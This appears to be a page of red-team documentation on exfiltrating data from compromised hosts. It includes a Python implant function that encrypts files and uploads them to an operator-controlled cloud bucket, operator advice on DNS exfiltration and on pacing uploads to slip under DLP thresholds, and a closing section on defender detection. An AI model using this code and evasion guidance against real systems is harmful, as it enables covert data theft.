# Data exfiltration

Getting data out is a different problem from getting a beacon in. The beacon is small, frequent, and shaped to
look like application traffic. Exfiltration involves volume: files, credentials, database contents, whatever
the objective required collecting. Volume is detectable in ways that a trickle beacon is not, and the exfil
channel has to survive for as long as the collection takes.

The useful property of CDN-backed and async exfil is that the implant and the operator do not need to be
simultaneously online. The implant stages data to an intermediate location; the operator retrieves it later
from outside the target's network entirely. If the implant is caught mid-operation, already-staged data is
still retrievable.

## CDN-backed staging

Object storage behind a CDN hostname accepts encrypted blobs from the implant and serves them to the operator
later. The traffic from the target looks like HTTPS uploads to a cloud storage service, which is indistinguishable
from legitimate application backup or sync traffic.

On the implant side:

```python
import boto3, os
from cryptography.fernet import Fernet

key = b"<pre-shared-key>"
f   = Fernet(key)

s3 = boto3.client(
    "s3",
    endpoint_url="https://s3.<region>.backblazeb2.com",
    aws_access_key_id=os.environ["B2_KEY_ID"],
    aws_secret_access_key=os.environ["B2_APP_KEY"],
)

def exfil(local_path, bucket, prefix="op/"):
    data = open(local_path, "rb").read()
    blob = f.encrypt(data)
    key_name = prefix + os.path.basename(local_path)
    s3.put_object(Bucket=bucket, Key=key_name, Body=blob)
```

The operator retrieves from the same bucket, decrypts with the same key. Credentials for the bucket are
embedded in the implant or delivered via the C2 channel; they are write-only if the provider supports
scoped access keys, so a seized implant cannot read back what was already staged.

Keep the bucket account separate from any account used in the [redirector infrastructure](../redirectors/cdn-fronting.md).
A single account linking exfil storage to C2 infrastructure is an unnecessary correlation.

## Chunked DNS exfiltration

For environments where HTTPS egress is blocked or monitored but DNS is not, data can leave as base32-encoded
subdomain labels. The implant resolves constructed names; the controlled authoritative resolver collects the
labels and reassembles them.

Bandwidth is low (roughly 1–2 KB per second sustained without triggering volume anomalies) and the technique
is well-catalogued. Use it for credentials, hashes, and small documents rather than bulk file exfil. The
channel overlap with [protocol rotators](../redirectors/protocol-rotators.md) is intentional: the same DNS
relay that carries C2 traffic can carry staged exfil.

## Volume pacing

DLP and egress monitoring detect large, sustained uploads more reliably than trickles. Pacing the exfil to
match the target's normal egress baseline extends the window before anomaly thresholds fire. A host that
routinely uploads 50 MB per day to cloud storage can absorb an exfil of comparable size; the same host
pushing 2 GB in an hour is an outlier regardless of the destination hostname.

Chunked uploads with randomised inter-chunk delays and targeting off-peak hours (when the baseline drops and
absolute volume is lower, but anomaly detection may also be understaffed) are worth factoring into the
exfil timing, not just the exfil mechanism.

## What the defender does with it

Volume is the primary signal when content inspection fails. DLP rules that fire on sustained high-volume
egress to cloud storage catch bulk exfil even when the destination is a legitimate bucket hostname. Write-only
access keys on the implant narrow the attack surface but do not affect what the egress logs show. DNS exfil
is caught by entropy and subdomain-length analysis rather than volume. The async pattern staggers the timing
across a longer window and reduces peak volume, which is exactly why it surfaces slower in detection than a
direct transfer, and not why it escapes detection entirely.
